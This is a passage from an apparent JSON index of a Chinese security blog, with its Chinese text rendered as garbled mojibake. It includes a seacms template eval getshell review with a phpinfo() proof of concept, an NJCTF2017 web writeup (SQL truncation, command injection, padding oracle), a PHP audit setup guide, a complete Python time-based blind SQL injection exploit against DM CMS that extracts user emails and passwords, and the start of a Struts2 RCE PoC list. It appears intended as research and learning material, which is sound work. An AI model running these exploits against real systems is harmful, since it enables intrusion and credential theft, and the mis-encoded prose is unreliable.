export_setçš„åº”ç”¨ï¼Œæ¯”è¾ƒé‡è¦çš„åº”ç”¨ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹å¯ç”¨äºç»•è¿‡"},{"title":"ã€Code Reviewã€‘seacms v6.5 å‰å°getshell","permalink":"http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/","text":"æ¦‚è¿°å‰æ®µæ—¶é—´æ”¾åœ¨90secä¸Šçš„ä¸€ç¯‡ä»£ç å®¡è®¡ï¼Œæ”¶æ‹¾ä¸€ä¸‹æ”¾åˆ°è‡ªå·±åšå®¢ä¸Š åˆ†æcmsç‰ˆæœ¬ï¼š6.45ç›´æ¥ä¸Šä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051function parseIf($content)&#123; if (strpos($content,&apos;&#123;if:&apos;)=== false)&#123; return $content; &#125;else&#123; $labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;); $labelRule2=&quot;&#123;elseif&quot;; $labelRule3=&quot;&#123;else&#125;&quot;; preg_match_all($labelRule,$content,$iar); $arlen=count($iar[0]); $elseIfFlag=false; for($m=0;$m&lt;$arlen;$m++)&#123; $strIf=$iar[1][$m]; $strIf=$this-&gt;parseStrIf($strIf); $strThen=$iar[2][$m]; $strThen=$this-&gt;parseSubIf($strThen); if (strpos($strThen,$labelRule2)===false)&#123; if (strpos($strThen,$labelRule3)&gt;=0)&#123; $elsearray=explode($labelRule3,$strThen); $strThen1=$elsearray[0]; $strElse1=$elsearray[1]; echo &quot;if(&quot;.$strIf.&quot;) &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;&quot;; eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifFlag=true;&#125;else&#123;\\$ifFlag=false;&#125;&quot;); if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125; &#125;else&#123; @eval(&quot;if(&quot;.$strIf.&quot;) &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;&quot;); if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],&quot;&quot;,$content);&#125; &#125;else&#123; $elseIfArray=explode($labelRule2,$strThen); $elseIfArrayLen=count($elseIfArray); $elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]); $resultStr=$elseIfSubArray[1]; $elseIfArraystr0=addslashes($elseIfArray[0]); @eval(&quot;if($strIf)&#123;\\$resultStr=\\&quot;$elseIfArraystr0\\&quot;;&#125;&quot;); for($elseIfLen=1;$elseIfLen&lt;$elseIfArrayLen;$elseIfLen++)&#123; $strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;); $strElseIf=$this-&gt;parseStrIf($strElseIf); $strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;)); @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\\$resultStr=\\&quot;$strElseIfThen\\&quot;;&#125;&quot;); @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\\$elseIfFlag=true;&#125;else&#123;\\$elseIfFlag=false;&#125;&quot;); if ($elseIfFlag) &#123;break;&#125; &#125; $strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;); $strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;)); if(strpos($strElseIf0,&apos;==&apos;)===false&amp;&amp;strpos($strElseIf0,&apos;=&apos;)&gt;0)$strElseIf0=str_replace(&apos;=&apos;, &apos;==&apos;, $strElseIf0); @eval(&quot;if(&quot;.$strElseIf0.&quot;)&#123;\\$resultStr=\\&quot;$strElseIfThen0\\&quot;;\\$elseIfFlag=true;&#125;&quot;); $content=str_replace($iar[0][$m],$resultStr,$content); &#125; &#125; return $content; &#125; &#125; ä¸Šé¢ä¸»è¦é€»è¾‘ä¸ºè§£æhtmlæ–‡ä»¶ä¸­çš„{if:}{end if}æ ‡ç­¾ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°æ²¡æœ‰åšä»»ä½•å¤„ç†å°±evalï¼Œé‚£ä¹ˆæˆ‘ä»¬æŸ¥æ‰¾ä¸€ä¸‹å¯¹åº”è°ƒç”¨çš„åœ°æ–¹ä¼šä¸ä¼šæœ‰æ¼æ´ã€‚ä¸»è¦å…³æ³¨å‰å°ï¼Œæ‰¾åˆ°ä¸€å¤„è§£ææœç´¢ç»“æœçš„é¡µé¢ï¼ˆsearch.phpï¼‰ï¼Œä»£ç æ¯”è¾ƒå¤šï¼Œä¸€ç‚¹ä¸€ç‚¹æ¥çœ‹ã€‚æ‰¾åˆ°è°ƒç”¨çš„ä½ç½®line 212$content=$mainClassObj-&gt;parseIf($content);å¾€ä¸Šçœ‹ï¼Œå‘ç°ä»–çš„é€»è¾‘æ˜¯å…ˆè§£æå…¶ä»–ç±»å‹çš„æ ‡ç­¾ï¼Œæ¯”å¦‚{searchpage:page}é‚£ä¹ˆæ¥ä¸‹æ¥çš„æ€è·¯ï¼Œä¸»è¦æ˜¯2ç‚¹ï¼ŒæŸ¥æ‰¾å¯¹åº”ifæ ‡ç­¾å¯æ§çš„ä½ç½®ï¼Œå¦ä¸€ç§å°±æ˜¯æŸ¥æ‰¾å…¶ä»–æ ‡ç­¾çš„å¯æ§å†…å®¹ï¼Œå†™å…¥ifæ ‡ç­¾æˆ‘æ‰¾åˆ°ä¸€å¤„å…¶ä»–æ ‡ç­¾å¯æ§ä¸”æ²¡æœ‰åšä»»ä½•å¤„ç†çš„ä½ç½®ï¼Œç›´æ¥å†™å…¥ifæ ‡ç­¾è¯­å¥å³å¯é€ æˆä»»æ„ä»£ç æ‰§è¡Œ1234567891011121314function echoSearchPage()&#123; global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost; $order = !empty($order)?$order:time;.........$content = str_replace(&quot;&#123;searchpage:page&#125;&quot;,$page,$content); $content = str_replace(&quot;&#123;seacms:searchword&#125;&quot;,$searchword,$content); $content = str_replace(&quot;&#123;seacms:searchnum&#125;&quot;,$TotalResult,$content); $content = str_replace(&quot;&#123;searchpage:ordername&#125;&quot;,$order,$content);......... orderå˜é‡å¯æ§å¹¶ä¸”åœ¨è°ƒç”¨parseIfå‡½æ•°å‰å…ˆè§£æï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡orderå†™å…¥ifæ ‡ç­¾ã€‚æŸ¥çœ‹ä¸€ä¸‹å…·ä½“htmlä»£ç 1234567&lt;div class=&quot;btn-toolbar&quot; role=&quot;toolbar&quot;&gt; &lt;div class=&quot;btn-group&quot;&gt; &lt;a href=&quot;&#123;searchpage:order-time-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;time&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderhits&quot;&gt;æœ€æ–°ä¸Šæ˜ &lt;/a&gt; &lt;a href=&quot;&#123;searchpage:order-hit-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;hit&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderaddtime&quot;&gt;æœ€è¿‘çƒ­æ’­&lt;/a&gt; &lt;a href=&quot;&#123;searchpage:order-score-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;score&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;ordergold&quot;&gt;è¯„åˆ†æœ€é«˜&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; é‚£ä¹ˆæ¥ä¸‹æ¥å°±å¯ä»¥æ„é€ pocäº†ï¼Œç±»ä¼¼sqlæ³¨å…¥ï¼Œæˆ‘ä»¬å…ˆæŠŠå‰é¢çš„ifæ ‡ç­¾è¯­å¥é—­åˆï¼Œå†™å…¥æ¶æ„ä»£ç å¹¶é—­åˆåé¢çš„ifæ ‡ç­¾ã€‚exampleï¼š}{end if}{if:1)phpinfo();if(1}{end if}æœ¬åœ°éªŒè¯ä¸€ä¸‹ æ€»ç»“è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒç»å…¸çš„æ¼æ´ï¼Œä¹Ÿå¯ä»¥è¢«ç§°ä¸ºæ¨¡ç‰ˆè§£æå§æˆ‘è§‰å¾—ï¼šï¼‰ps: åæ‚”å•Šï¼Œæ²¡æœ‰å…ˆæäº¤ä¸ªpocå¹³å°T_T"},{"title":"ã€CTFã€‘NJCTF2017 writeup","permalink":"http://blog.0kami.cn/2017/03/15/old-njctf-2017/","text":"æ¦‚è¿°è¾èŒåæ²¡äº‹æƒ…å¹²ï¼Œåˆšå¥½èµ¶ä¸Šnjctfï¼Œè¿˜æ˜¯ä¸€æ ·èœå•Šï¼Œåªåšäº†7é“é¢˜ï¼Œè¿˜è¦ç»§ç»­åŠªåŠ›ğŸ’ªï¼ˆps:æ¯•ä¸šè®¾è®¡ä»€ä¹ˆé¬¼å•Šï¼‰å†™ä¸€ä¸‹webçš„writeupï¼Œç”±äºé¢˜ç›®è¿˜å¼€ç€ï¼ŒæŠŠæ²¡åšå‡ºæ¥çš„åšä¸€éï¼Œçºªå½•ä¸€ä¸‹æˆ‘è§‰å¾—æœ‰å¿…è¦è®°çš„é¢˜ Webé¢˜Loginï¼ˆ100ï¼‰å¥½å§ï¼Œè¿™é“é¢˜å–äº†å·§ï¼Œè°è®©å¤§é»‘å®¢ä»¬éƒ½æ˜¯å¼±å¯†ç å‘¢ï¼ï¼ï¼ï¼ç”±äºæ²¡æœ‰åšéªŒè¯ç æœºåˆ¶ï¼Œæ‰€ä»¥æ‰«äº†ä¸€æ³¢å¼±å£ä»¤ï¼Œç„¶åâ€¦ç„¶åå°±è¿›å»å•¦å…¶å®è¿™é“é¢˜è€ƒçš„æ˜¯mysqlçš„é•¿åº¦é™åˆ¶æ¼æ´ã€‚åˆ©ç”¨2ä¸ªmysqlçš„ç‰¹æ€§ å½“æ•°æ®è¶…è¿‡å»ºè¡¨æ—¶çš„è§„å®šçš„æ•°æ®å¤§å°ï¼Œmysqlå°†è¶…è¿‡çš„éƒ¨åˆ†æˆªæ–­ å½“selectæ—¶whereæŸ¥è¯¢å­—å¥ä¸­çš„æ•°æ®å¦‚æœæœ€åä»¥ç©ºæ ¼ç»“å°¾ï¼Œmysqlé»˜è®¤å°†ç©ºæ ¼å»é™¤æŸ¥è¯¢é‚£ä¹ˆåˆ©ç”¨è¿™2ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬åªè¦æ³¨å†Œä¸€ä¸ªadmin+N*%20+xå°±å¯ä»¥å·²adminç™»é™†ï¼Œç„¶ågetflagï¼šNJCTF{4R3_Y0u_7H3_Re41_aDM1N?} Get Flag(100)è¿™é“é¢˜è€ƒäº†å‘½ä»¤æ‰§è¡Œæ¼æ´é¦–å…ˆå‘ç°å­˜åœ¨æ–‡ä»¶ä»»æ„è¯»å–æ¼æ´ï¼Œé‚£ä¹ˆå°è¯•è¯»å–ä¸€ä¸‹æºç ï¼Œæœ€åè¯•å‡ºæ¥æ˜¯app.pyå¯ä»¥çœ‹åˆ°æœ‰ä¸ªå‘½ä»¤æ‰§è¡Œå¹¶ä¸”æ˜¯å¯æ§çš„ï¼Œä½†æ˜¯è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œç”¨&amp;å°±å¯ä»¥ç»•è¿‡ã€‚ls æŸ¥çœ‹ä¸€ä¸‹å¯ä»¥çœ‹åˆ°flagæ–‡ä»¶9iZM2qTEmq67SOdJp%!oJm2%M4!nhS_thi5_flagcatä¸€æ³¢ï¼Œè¿™é‡Œçš„ç‰¹æ®Šå­—ç¬¦è½¬ç§»æ˜¯å…³é”® come on(200)å…·ä½“çœ‹å¤§ä½¬ä»¬çš„writeupå³å¯ï¼Œè¿™é“é¢˜ä¸»è¦å­¦åˆ°äº†å…¶ç›²æ³¨çš„æ³¨å…¥æ–¹å¼ã€‚binaryå‡½æ•°ç”¨æ¥åŒºåˆ†å¤§å°å†™ 12345select xxx from xxx like x%select xxx from xxx like xx%select xxx from xxx like xxx%select xxx from xxx like xxxx%... é€šè¿‡likeæ¥ä½å‡ºæ•°æ® Be Admin(300)é¦–å…ˆå‘ç°æœ‰.bakæ–‡ä»¶ï¼Œä¸‹ä¸‹æ¥çœ‹ä¸€ä¸‹,å‘ç°è¿™é“é¢˜ä¸»è¦è€ƒçš„æ˜¯cbcå­—èŠ‚ç¿»è½¬æ”»å‡»å’Œpadding oracle attack.é¦–å…ˆç”±äºç™»é™†å‡ºå­˜åœ¨æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ•°æ®ä¸­çš„encrypt_passå–å‡ºæ¥ç™»é™†ç»•è¿‡å¯ä»¥é€šè¿‡phpå¼±ç±»å‹æ¯”è¾ƒæ¥ç»•è¿‡ï¼Œadminï¼0å³å¯ç™»é™†è¦é€šè¿‡cbcå­—èŠ‚ç¿»è½¬å¿…é¡»çŸ¥é“defaultIdçš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆè·‘å‡ºdefaultIdçš„å€¼padding oracle attackå‚è€ƒpadding oracle attackç¬¦åˆæˆ‘ä»¬ç°åœ¨çš„æƒ…å†µï¼š å·²çŸ¥çœŸå®IV å·²çŸ¥å¯¹åº”cipher text å½“è§£å¯†å¤±è´¥ERRORé”™è¯¯é¢˜ç›®ç¯å¢ƒå¯èƒ½åäº†ï¼Œæœ¬åœ°æ­ä¸€ä¸‹ï¼Œè·‘ä¸€ä¸‹ä¸­é—´å€¼éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯padding oracle attackç¬¬ä¸€ä¸ªå­—ç¬¦æ²¡åŠæ³•è·‘å‡ºæ¥ï¼Œç”±äºæœ€åä¸€ä¸ªå­—ç¬¦è§£å‡ºæ¥æ˜¯ç©ºç™½æ‰€ä»¥è¿˜æ˜¯errorï¼Œä¸è¿‡æ²¡å…³ç³»æš´åŠ›ä¸€éå°±å¥½äº†ï¼ˆpsï¼šæœ‰äº†åŸç†ï¼Œå†™ä»£ç å¾ˆå®¹æ˜“ï¼Œå°±ä¸æ”¾ä»£ç äº†ï¼‰ æ€»ç»“æ¬ ç¼ºçš„è¿˜æ˜¯å¾ˆå¤šï¼Œç»§ç»­ğŸ’ª"},{"title":"ã€OTHERSã€‘phpä»£ç å®¡è®¡å‰çš„å‡†å¤‡","permalink":"http://blog.0kami.cn/2017/02/03/old-code-review-pre-prepare/","text":"æ¦‚è¿°æ‰€è°“â€œå·¥æ¬²å–„å…¶äº‹,å¿…å…ˆåˆ©å…¶å™¨â€ï¼Œåœ¨ä»£ç å®¡è®¡å‰ï¼Œæˆ‘ä»¬éœ€è¦å‡†å¤‡æé«˜æˆ‘ä»¬å®¡è®¡æ•ˆç‡çš„å·¥å…·ã€‚ ç¯å¢ƒ Mac xampp(å¯ä»¥ç”¨phpstudyæˆ–è€…æ˜¯å…¶ä»–é›†æˆç¯å¢ƒä»£æ›¿) Navicat Premium(ä¸ªäººè®¤ä¸ºMacä¸‹æœ€å¥½çš„æ•°æ®åº“ç®¡ç†å·¥å…·ï¼Œå­¦ç”Ÿå…šåªèƒ½ç”¨**,æœ‰èƒ½åŠ›å°½é‡æ”¯æŒæ­£ç‰ˆ) phpstorm(è¿™é‡Œçš„IDEç”¨çš„æ˜¯æˆ‘è‡ªå·±æ¯”è¾ƒä¹ æƒ¯çš„ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–ä½ æ¯”è¾ƒç†Ÿæ‚‰çš„) xdebug(ç”¨æ¥åŠ¨æ€è°ƒè¯•) ç»ˆç«¯ æµè§ˆå™¨(firefoxã€chrome,è¿™é‡Œä½¿ç”¨firefox,hackbaræ˜¯ä¸ªå¥½ä¸œè¥¿) å®‰è£…ä¸Šè¿°çš„è½¯ä»¶ä¹‹ç±»çš„å°±ä¸è¯´äº†ï¼Œä¸‹æ–‡ä¸»è¦æ˜¯åŠ¨æ€è°ƒè¯•ç¯å¢ƒæ­å»ºã€‚ åŠ¨æ€è°ƒè¯•ç¯å¢ƒphpæ·»åŠ xdebugé…ç½®xamppçš„php.iniä½äº/install/path/etc/php.iniï¼Œåœ¨é…ç½®æ–‡ä»¶æœ€åæ·»åŠ ä¸Š 1234567891011[xdebug]zend_extension=/Applications/XAMPP/xamppfiles/lib/php/extensions/no-debug-non-zts-20131226/xdebug.soxdebug.remote_autostart=onxdebug.remote_enable=onxdebug.remote_enable=1xdebug.remote_mode=&quot;req&quot;xdebug.remote_log=&quot;/var/log/xdebug.log&quot;xdebug.remote_host=localhost/127.0.0.1xdebug.remote_port=9000xdebug.remote_handler=&quot;dbgp&quot;xdebug.idekey=&quot;PhpStorm&quot; soæ–‡ä»¶æ˜¯xamppè‡ªå¸¦çš„ï¼Œmacä¸‹çš„é…ç½®å¯ä»¥ç›´æ¥copyæˆ‘çš„ä¿å­˜åé‡å¯apache firefoxå®‰è£…xdebugæ‰©å±•firefoxä¸‹çš„xdebugæ‰©å±•å« the easiest xdebugï¼Œæœç´¢ä¸€ä¸‹å®‰è£…å®‰è£…å®Œæˆåç‚¹äº®å·¥å…·æ ä¸Šçš„ç”²è™«ï¼Œå¼€å¯è°ƒè¯•è®¾ç½®key,æ›´phpé…ç½®æ–‡ä»¶ä¸­ç›¸åŒ é…ç½®phpstormæ‰“å¼€Preferences-&gt;Languages&amp;Framework-&gt;phpå¦‚å›¾è®¾ç½®serversï¼Œæ¥ç€è®¾ç½®debugä¸‹çš„DBGp Proxyè®¾ç½®å®Œæˆååœ¨å·¥å…·æ å¤„æ‰¾åˆ°edit Configurationsæ–°å¢php web applicationæ¥ä¸‹æ¥å°±å¯ä»¥æ„‰å¿«çš„ä¸‹æ–­ç‚¹ï¼ŒåŠ¨æ€è°ƒè¯•äº† mysqlæ‰§è¡Œå®¡è®¡ç›‘æ§åœ¨navicatæˆ–ç»ˆç«¯ä¸­è¿è¡Œä»¥ä¸‹2å¥ set global general_log=on;set global log_output=â€™tableâ€™; æŸ¥çœ‹mysql.general_logè¡¨å¯ä»¥çœ‹åˆ°è¿è¡Œè¿‡çš„sqlè¯­å¥ï¼Œæ–¹ä¾¿æˆ‘ä»¬æŸ¥è¯¢winä¸‹å¯ä»¥ç”¨seayçš„ä»£ç å®¡è®¡å·¥å…·ï¼Œå¸¦äº†mysqlçš„sqlç›‘æ§ ç»ˆç«¯ç»ˆç«¯ä¸»è¦ç”¨åˆ°äº†grepè¿™ä¸ªå·¥å…·ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šç›¸å…³çš„æ•™æã€‚ä¸»è¦åŒ¹é…è¾“å…¥è¾“å‡ºç‚¹ï¼Œå±é™©å‡½æ•°ç­‰ç­‰å…·ä½“çš„ä»¥åæœ‰ç©ºäº†å†è¡¥å…… æ€»ç»“è®°å½•ä¸€ä¸‹è¿‡ç¨‹ï¼Œä»¥åèƒ½çœ‹çœ‹ï¼Œæ„‰å¿«çš„ä»£ç å®¡è®¡å§:P"},{"title":"ã€Code Reviewã€‘DMä¼ä¸šå»ºç«™ç³»ç»Ÿå‰å°ç›²æ³¨","permalink":"http://blog.0kami.cn/2017/01/29/old-DM-sql-injection/","text":"æ¦‚è¿°ä»Šå¤©æäº†ä¸€ä¸‹åŠ¨æ€è°ƒè¯•çš„ä¸œè¥¿ï¼Œç„¶åé¡ºä¾¿çœ‹äº†çœ‹ä¸Šæ¬¡ä¸‹çš„DMä¼ä¸šå»ºç«™ç³»ç»Ÿ2017.01.23ã€‚ å‰å°cookie æ—¶é—´ç›²æ³¨å¤§è‡´è·Ÿäº†ä¸€ä¸‹å‡ ä¸ªå…¥å£æ–‡ä»¶ï¼Œè¯¥å¥—cmsä¸»è¦çš„å®‰å…¨æªæ–½ä¸ºhtmlentitiesï¼Œåœ¨POST&amp;&amp;GETçš„è¾“å…¥ç‚¹åšäº†htmlå®ä½“åŒ–çš„æ“ä½œï¼Œä½†æ˜¯è¿™å¹¶ä¸è½¬ä¹‰å•å¼•å·ï¼ˆé»˜è®¤ä¸è½¬ä¹‰å•å¼•å·å…·ä½“å¯çœ‹htmlentitiesï¼‰ï¼Œçœ‹äº†ä¸€ä¸‹è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢çš„sqlè¯­å¥ï¼Œæ¶‰åŠåˆ°å­—ç¬¦ä¸²ç±»å‹æ—¶ï¼Œéƒ½æ˜¯å•å¼•å·é—­åˆï¼Œé‚£ä¹ˆå¾ˆæ¸…æ¥šï¼Œåœ¨è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢æ—¶å®¹æ˜“äº§ç”Ÿsqlæ³¨å…¥æ¼æ´ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥ä¸»è¦æ‰¾ä¸€ä¸‹è¿›è¡Œæ•°æ®åº“æ“ä½œçš„ä½ç½®ã€‚ POST&amp;&amp;GET COOKIE psï¼šè¿™é‡Œå°±éšä¾¿æ‰¾äº†ä¸€ä¸ªåœ°æ–¹ï¼Œå› ä¸ºè¿™å¥—ç³»ç»Ÿæ³¨å…¥ä¸è¦å¤ªå¤šï¼Œè¿åå°ç™»é™†éƒ½å¯ä»¥ :P å‰é¢æåˆ°å¯¹POST&amp;&amp;GETåšäº†å®ä½“è½¬ä¹‰ï¼Œä½†æ˜¯grepæ‰¾äº†ä¸€ä¸‹cookieï¼Œå‘ç°å¹¶æ²¡æœ‰å¯¹cookieçš„å€¼è¿›è¡Œå®‰å…¨æ“ä½œï¼Œç›´æ¥å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚indexDM_load.php Line 108 12345678910111213...if(@$_COOKIE[&quot;curstyle&quot;]&lt;&gt;&apos;&apos;) $curstyle = $_COOKIE[&quot;curstyle&quot;];else $curstyle = $row[&apos;curstyle&apos;]; ...$sqlstyle = &quot;SELECT * from &quot;.TABLE_STYLE.&quot; where pidname=&apos;$curstyle&apos; $andlangbh limit 1&quot;; //echo $sqlstyle;exit;if(getnum($sqlstyle)&gt;0)&#123; $rowstyle = getrow($sqlstyle); ä¸Šè¿°ä¸ºæ¼æ´çš„ä¸»è¦æˆå› ç‚¹ï¼Œå¦‚æœcookieä¸­å­˜åœ¨curstyle,ä¼˜å…ˆé€‰ç”¨cookieä¸­çš„å€¼ï¼Œç„¶åå¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚ç”±äºæ²¡æœ‰æ‰¾åˆ°å…·ä½“å›æ˜¾æ•°æ®çš„åœ°æ–¹ï¼Œæ‰€ä»¥é‡‡ç”¨æ—¶é—´ç›²æ³¨çš„æ–¹å¼è·å–æ•°æ®ã€‚ å¸¦ä¸Šè‡ªå·±å†™çš„EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#!/usr/bin/env python# -*- coding: utf-8 -*-# Created by wh1t3P1g at 2017/1/30import requests,timeclass CookieBlindSqlInjection: def __init__(self,url): self.url=url self.len=0 def getLength(self,column,table): payload0 = &quot;curstyle=1&apos;||if((select length(cast(bin(length(&#123;column&#125;)) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot; payload1 = &quot;curstyle=1&apos;||if((select substr(bin(length(&#123;column&#125;)),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot; #first confirm bin-format data length len=0 for i in range(1,9): cookie=payload0.format(column=column,table=table,line_start=0,flag=i) flag=self.send(cookie) if flag==&quot;0&quot;: len=i break res=&quot;&quot; for i in range(1,len+1): cookie=payload1.format(column=column,col_start=i,table=table,line_start=0) flag=self.send(cookie) res+=flag # print res self.len=int(res,2) pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot; length: &quot;+str(self.len)) return int(res,2) def getData(self,column,table): payload0=&quot;curstyle=1&apos;||if((select length(cast(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot; payload1 = &quot;curstyle=1&apos;||if((select substr(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot; total_res=&quot;&quot; for i in range(1,self.len+1):#å…·ä½“æ•°æ®çš„é•¿åº¦ len = 0 for j in range(1, 9): cookie = payload0.format(column=column,data_start=i, table=table, line_start=0, flag=j) flag = self.send(cookie) if flag == &quot;0&quot;: len = j break # print &quot;len:&quot;+str(len) res = &quot;&quot; for k in range(1, len + 1): cookie = payload1.format(column=column,data_start=i, col_start=k, table=table, line_start=0) flag = self.send(cookie) res += flag # print res total_res+=chr(int(res,2)) pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot;: &quot;+total_res) return total_res def send(self,cookie): headers=&#123;&quot;Cookie&quot;:cookie&#125; try: r = requests.get(self.url, headers=headers,timeout=4) return &quot;1&quot; except: return &quot;0&quot;def pprint(flag,content): print &quot;[&#123;flag&#125;] [&#123;time&#125;] &#123;content&#125;&quot; \\ .format(flag=flag, time=time.asctime(time.localtime(time.time())), content=content)if __name__==&apos;__main__&apos;: cookieBlindSqlInjection=CookieBlindSqlInjection(&quot;http://127.0.0.1/cms/DM/20170123/&quot;) pprint(&quot;*&quot;,&quot;program start&quot;) pprint(&quot;*&quot;, &quot;start fetching column[email]&quot;) cookieBlindSqlInjection.getLength(&quot;email&quot;,&quot;zzz_user&quot;) email=cookieBlindSqlInjection.getData(&quot;email&quot;,&quot;zzz_user&quot;) pprint(&quot;*&quot;, &quot;start fetching column[ps]&quot;) cookieBlindSqlInjection.getLength(&quot;ps&quot;, &quot;zzz_user&quot;) ps=cookieBlindSqlInjection.getData(&quot;ps&quot;, &quot;zzz_user&quot;) pprint(&quot;*&quot;, &quot;[email]: &quot;+email+&quot; ,[ps]: &quot;+ps) pprint(&quot;*&quot;, &quot;program done&quot;) ps:DMè¿™ä¸ªé¬¼ï¼Œä»£ç å†™çš„å¥½ä¹±å•ŠT_T"},{"title":"ã€VULNERABLITYã€‘Struts2å‘½ä»¤æ‰§è¡Œå„ç‰ˆæœ¬è®°å½•","permalink":"http://blog.0kami.cn/2017/01/13/old-Struts2-history-payload/","text":"æ¦‚è¿°æœ€è¿‘åœ¨å†™Struts2çš„ä¸€äº›PoCï¼Œè®°å½•ä¸€ä¸‹å„ä¸ªç‰ˆæœ¬çš„PoCæ–¹ä¾¿åˆ°æ—¶å€™æŸ¥é˜…ã€‚å…ˆæä¸€ä¸‹å‚è€ƒçš„å‰è¾ˆä»¬çš„ç½‘å€ï¼Œæ„Ÿè°¢ğŸ™ http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html http://www.cnblogs.com/LittleHann/p/4606891.html https://cwiki.apache.org/confluence/display/WW/S2-xxx http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html https://cwiki.apache.org/confluence/display/WW/S2-009 Struts2å‘½ä»¤æ‰§è¡Œé›†åˆä¸‹æ–‡ä¸æ˜¯å…·ä½“çš„åˆ†ææ–‡ï¼Œèƒ½åŠ›æœ‰é™ï¼Œä»…è®°å½•ä¸€ä¸‹ä»¥åšå°†æ¥å¤ä¹ æŸ¥ç”¨ã€‚è¿‡æ®µæ—¶é—´ä¼šå°†æ‰€æœ‰çš„æ¼æ´ç¯å¢ƒä¸Šä¼ åˆ°githubä¸Šï¼Œç¯å¢ƒæ¥æºå¤§éƒ¨åˆ†ä¸ºæˆ‘å¶åƒrickgrayåšå®¢ä¸Šå…±äº«çš„ä»¥åŠå®˜ç½‘ä¸Šä¸‹çš„å¯¹åº”ç‰ˆæœ¬çš„ç¤ºä¾‹ç¯å¢ƒã€‚update:2017/1/16 ç¯å¢ƒåœ°å€ Struts2 S2-001å½±å“ç‰ˆæœ¬ï¼š2.0.0 - 2.0.8 å…·ä½“è¯¦æƒ…ï¼šhttps://struts.apache.org/docs/s2-001.html è¯¥æ¼æ´å› ä¸ºç”¨æˆ·æäº¤è¡¨å•æ•°æ®å¹¶ä¸”éªŒè¯å¤±è´¥æ—¶ï¼Œåç«¯ä¼šå°†ç”¨æˆ·ä¹‹å‰æäº¤çš„å‚æ•°å€¼ä½¿ç”¨ OGNL è¡¨è¾¾å¼ %{value} è¿›è¡Œè§£æï¼Œç„¶åé‡æ–°å¡«å……åˆ°å¯¹åº”çš„è¡¨å•æ•°æ®ä¸­ã€‚ä¾‹å¦‚æ³¨å†Œæˆ–ç™»å½•é¡µé¢ï¼Œæäº¤å¤±è´¥åç«¯ä¸€èˆ¬ä¼šé»˜è®¤è¿”å›ä¹‹å‰æäº¤çš„æ•°æ®ï¼Œç”±äºåç«¯ä½¿ç”¨ %{value} å¯¹æäº¤çš„æ•°æ®æ‰§è¡Œäº†ä¸€æ¬¡ OGNL 